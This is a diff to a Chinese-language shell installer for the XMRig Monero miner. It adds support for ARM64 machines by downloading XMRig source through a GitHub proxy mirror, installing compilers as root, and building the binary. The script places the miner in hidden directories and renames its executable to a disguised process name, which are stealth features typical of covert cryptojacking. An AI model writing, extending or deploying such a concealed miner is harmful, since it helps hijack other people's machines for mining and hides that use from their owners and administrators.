@@ -159,11 +159,20 @@ detect_system() {
     case $ARCH in
         x86_64|amd64)
             ARCH="x64"
+            COMPILE_FROM_SOURCE=false
             ;;
         aarch64|arm64)
-            log_error "XMRig不支持Linux系统的ARM64架构"
-            log_error "请使用x64系统运行XMRig"
-            exit 1
+            ARCH="arm64"
+            log_warn "检测到ARM64架构，XMRig官方不提供预编译版本"
+            log_warn "需要从源码编译安装"
+            echo
+            read -p "是否继续编译安装？(y/n): " -n 1 -r
+            echo
+            if [[ ! $REPLY =~ ^[Yy]$ ]]; then
+                log_info "用户取消安装"
+                exit 0
+            fi
+            COMPILE_FROM_SOURCE=true
             ;;
         *)
             log_error "不支持的CPU架构: $ARCH"
@@ -297,6 +306,31 @@ check_prerequisites() {
         missing_commands="$missing_commands tar"
     fi
     
+    # 如果需要编译，检查编译工具
+    if [ "$COMPILE_FROM_SOURCE" = true ]; then
+        log_info "检查编译工具..."
+        
+        if ! command -v gcc >/dev/null 2>&1 && ! command -v clang >/dev/null 2>&1; then
+            missing_commands="$missing_commands gcc或clang"
+        fi
+        
+        if ! command -v g++ >/dev/null 2>&1 && ! command -v clang++ >/dev/null 2>&1; then
+            missing_commands="$missing_commands g++或clang++"
+        fi
+        
+        if ! command -v make >/dev/null 2>&1; then
+            missing_commands="$missing_commands make"
+        fi
+        
+        if ! command -v cmake >/dev/null 2>&1; then
+            missing_commands="$missing_commands cmake"
+        fi
+        
+        if ! command -v git >/dev/null 2>&1; then
+            missing_commands="$missing_commands git"
+        fi
+    fi
+    
     if [ -n "$missing_commands" ]; then
         log_warn "缺少必需的命令:$missing_commands"
         log_info "尝试安装缺少的依赖..."
@@ -322,6 +356,34 @@ check_prerequisites() {
             exit 1
         fi
         
+        # 如果需要编译，重新检查编译工具
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            if ! command -v gcc >/dev/null 2>&1 && ! command -v clang >/dev/null 2>&1; then
+                log_error "安装C编译器失败。请手动安装gcc或clang后重新运行脚本。"
+                exit 1
+            fi
+            
+            if ! command -v g++ >/dev/null 2>&1 && ! command -v clang++ >/dev/null 2>&1; then
+                log_error "安装C++编译器失败。请手动安装g++或clang++后重新运行脚本。"
+                exit 1
+            fi
+            
+            if ! command -v make >/dev/null 2>&1; then
+                log_error "安装make失败。请手动安装make后重新运行脚本。"
+                exit 1
+            fi
+            
+            if ! command -v cmake >/dev/null 2>&1; then
+                log_error "安装cmake失败。请手动安装cmake后重新运行脚本。"
+                exit 1
+            fi
+            
+            if ! command -v git >/dev/null 2>&1; then
+                log_error "安装git失败。请手动安装git后重新运行脚本。"
+                exit 1
+            fi
+        fi
+        
         log_info "所有必需的依赖现在都可用了。"
     else
         log_info "所有必需的依赖都可用。"
@@ -338,43 +400,101 @@ install_missing_dependencies() {
         fi
         
         log_info "安装缺少的包..."
-        apt-get install -y wget curl tar || {
-            log_error "安装包失败。请运行: sudo apt-get install wget curl tar"
-            exit 1
-        }
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            apt-get install -y wget curl tar build-essential cmake git || {
+                log_error "安装包失败。请运行: sudo apt-get install wget curl tar build-essential cmake git"
+                exit 1
+            }
+        else
+            apt-get install -y wget curl tar || {
+                log_error "安装包失败。请运行: sudo apt-get install wget curl tar"
+                exit 1
+            }
+        fi
         
     elif command -v yum >/dev/null 2>&1; then
         # CentOS/RHEL 7
-        yum install -y wget curl tar || {
-            log_error "安装包失败。请运行: sudo yum install wget curl tar"
-            exit 1
-        }
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            yum groupinstall -y "Development Tools" || {
+                log_error "安装开发工具失败。请运行: sudo yum groupinstall \"Development Tools\""
+                exit 1
+            }
+            yum install -y wget curl tar cmake git || {
+                log_error "安装包失败。请运行: sudo yum install wget curl tar cmake git"
+                exit 1
+            }
+        else
+            yum install -y wget curl tar || {
+                log_error "安装包失败。请运行: sudo yum install wget curl tar"
+                exit 1
+            }
+        fi
     elif command -v dnf >/dev/null 2>&1; then
         # CentOS/RHEL 8+/Fedora
-        dnf install -y wget curl tar || {
-            log_error "安装包失败。请运行: sudo dnf install wget curl tar"
-            exit 1
-        }
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            dnf groupinstall -y "Development Tools" || {
+                log_error "安装开发工具失败。请运行: sudo dnf groupinstall \"Development Tools\""
+                exit 1
+            }
+            dnf install -y wget curl tar cmake git || {
+                log_error "安装包失败。请运行: sudo dnf install wget curl tar cmake git"
+                exit 1
+            }
+        else
+            dnf install -y wget curl tar || {
+                log_error "安装包失败。请运行: sudo dnf install wget curl tar"
+                exit 1
+            }
+        fi
     elif command -v zypper >/dev/null 2>&1; then
         # openSUSE
-        zypper install -y wget curl tar || {
-            log_error "安装包失败。请运行: sudo zypper install wget curl tar"
-            exit 1
-        }
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            zypper install -y -t pattern devel_basis || {
+                log_error "安装开发工具失败。请运行: sudo zypper install -t pattern devel_basis"
+                exit 1
+            }
+            zypper install -y wget curl tar cmake git || {
+                log_error "安装包失败。请运行: sudo zypper install wget curl tar cmake git"
+                exit 1
+            }
+        else
+            zypper install -y wget curl tar || {
+                log_error "安装包失败。请运行: sudo zypper install wget curl tar"
+                exit 1
+            }
+        fi
     elif command -v pacman >/dev/null 2>&1; then
         # Arch Linux
-        pacman -Sy --noconfirm wget curl tar || {
-            log_error "安装包失败。请运行: sudo pacman -S wget curl tar"
-            exit 1
-        }
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            pacman -Sy --noconfirm base-devel wget curl tar cmake git || {
+                log_error "安装包失败。请运行: sudo pacman -S base-devel wget curl tar cmake git"
+                exit 1
+            }
+        else
+            pacman -Sy --noconfirm wget curl tar || {
+                log_error "安装包失败。请运行: sudo pacman -S wget curl tar"
+                exit 1
+            }
+        fi
     elif command -v apk >/dev/null 2>&1; then
         # Alpine Linux
-        apk add --no-cache wget curl tar || {
-            log_error "安装包失败。请运行: sudo apk add wget curl tar"
-            exit 1
-        }
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            apk add --no-cache wget curl tar build-base cmake git || {
+                log_error "安装包失败。请运行: sudo apk add wget curl tar build-base cmake git"
+                exit 1
+            }
+        else
+            apk add --no-cache wget curl tar || {
+                log_error "安装包失败。请运行: sudo apk add wget curl tar"
+                exit 1
+            }
+        fi
     else
-        log_error "无法识别包管理器。请手动安装 wget、curl、tar 后重新运行脚本。"
+        if [ "$COMPILE_FROM_SOURCE" = true ]; then
+            log_error "无法识别包管理器。请手动安装 wget、curl、tar、gcc、g++、make、cmake、git 后重新运行脚本。"
+        else
+            log_error "无法识别包管理器。请手动安装 wget、curl、tar 后重新运行脚本。"
+        fi
         exit 1
     fi
 }
@@ -387,6 +507,17 @@ download_and_install() {
     create_hidden_dirs
     cd "$WORK_DIR"
     
+    if [ "$COMPILE_FROM_SOURCE" = true ]; then
+        # ARM架构：下载源码并编译
+        compile_from_source
+    else
+        # x64架构：下载预编译版本
+        download_precompiled_binary
+    fi
+}
+
+# 下载预编译二进制文件
+download_precompiled_binary() {
     # 下载文件 - 优先使用wget，备用curl
     log_info "下载 $FILENAME ..."
     
@@ -477,6 +608,144 @@ download_and_install() {
     
     # 创建软链接保持兼容性
     ln -sf "$disguise_name" xmrig
+}
+
+# 从源码编译XMRig
+compile_from_source() {
+    log_info "开始从源码编译XMRig..."
+    
+    # 设置源码下载URL和文件名
+    local SOURCE_URL="https://gh.llkk.cc/https://github.com/xmrig/xmrig/archive/v${VERSION}.tar.gz"
+    local SOURCE_FILENAME="xmrig-${VERSION}.tar.gz"
+    
+    log_info "下载源码: $SOURCE_FILENAME"
+    
+    # 下载源码
+    if command -v wget >/dev/null 2>&1; then
+        log_info "使用wget下载源码..."
+        if wget -q --show-progress "$SOURCE_URL" -O "$SOURCE_FILENAME" 2>/dev/null; then
+            log_info "wget下载成功"
+        else
+            log_warn "wget下载失败，尝试使用curl..."
+            rm -f "$SOURCE_FILENAME"
+            
+            if command -v curl >/dev/null 2>&1; then
+                if curl -L -o "$SOURCE_FILENAME" "$SOURCE_URL" --progress-bar; then
+                    log_info "curl下载成功"
+                else
+                    log_error "curl下载也失败"
+                    exit 1
+                fi
+            else
+                log_error "wget和curl都不可用，无法下载源码"
+                exit 1
+            fi
+        fi
+    elif command -v curl >/dev/null 2>&1; then
+        log_info "使用curl下载源码..."
+        if curl -L -o "$SOURCE_FILENAME" "$SOURCE_URL" --progress-bar; then
+            log_info "curl下载成功"
+        else
+            log_error "curl下载失败"
+            exit 1
+        fi
+    else
+        log_error "wget和curl都不可用，无法下载源码"
+        exit 1
+    fi
+    
+    # 验证下载的源码文件
+    if [ ! -f "$SOURCE_FILENAME" ] || [ ! -s "$SOURCE_FILENAME" ]; then
+        log_error "下载的源码文件不存在或为空"
+        exit 1
+    fi
+    
+    log_info "源码下载完成，大小: $(du -h "$SOURCE_FILENAME" | cut -f1)"
+    
+    # 解压源码到当前目录
+    log_info "解压源码..."
+    tar -xzf "$SOURCE_FILENAME" || {
+        log_error "解压源码失败"
+        exit 1
+    }
+    
+    # 清理源码压缩包
+    rm -f "$SOURCE_FILENAME"
+    
+    # 进入源码目录
+    local SOURCE_DIR="xmrig-${VERSION}"
+    if [ ! -d "$SOURCE_DIR" ]; then
+        log_error "源码目录 $SOURCE_DIR 不存在"
+        exit 1
+    fi
+    
+    cd "$SOURCE_DIR" || {
+        log_error "无法进入源码目录 $SOURCE_DIR"
+        exit 1
+    }
+    
+    log_info "进入源码目录: $(pwd)"
+    
+    # 开始编译
+    log_info "开始编译XMRig..."
+    
+    # 创建构建目录
+    mkdir -p build
+    cd build
+    
+    # 运行cmake配置
+    log_info "运行cmake配置..."
+    if ! cmake .. -DCMAKE_BUILD_TYPE=Release; then
+        log_error "cmake配置失败"
+        exit 1
+    fi
+    
+    # 编译
+    log_info "开始编译（这可能需要几分钟）..."
+    local cpu_cores=$(nproc 2>/dev/null || echo "1")
+    if ! make -j"$cpu_cores"; then
+        log_error "编译失败"
+        exit 1
+    fi
+    
+    # 检查编译结果
+    if [ ! -f "xmrig" ]; then
+        log_error "编译完成但未找到xmrig可执行文件"
+        exit 1
+    fi
+    
+    log_info "编译成功！"
+    
+    # 复制编译好的文件到工作目录
+    cp xmrig "$WORK_DIR/"
+    cd "$WORK_DIR"
+    
+    # 清理源码目录
+    log_info "清理源码目录..."
+    rm -rf "xmrig-${VERSION}"
+    
+    # 获取伪装名称
+    local disguise_name=$(get_disguise_name)
+    
+    # 设置执行权限
+    chmod +x xmrig
+    
+    # 进程名称伪装
+    log_info "设置进程伪装..."
+    log_info "将xmrig重命名为: $disguise_name"
+    
+    # 重命名xmrig为伪装名称
+    mv xmrig "$disguise_name" || {
+        log_error "重命名xmrig失败"
+        exit 1
+    }
+    
+    # 设置伪装文件的执行权限
+    chmod +x "$disguise_name"
+    
+    # 创建软链接保持兼容性
+    ln -sf "$disguise_name" xmrig
+}
     
     # 更新全局变量
     DISGUISE_NAME="$disguise_name"
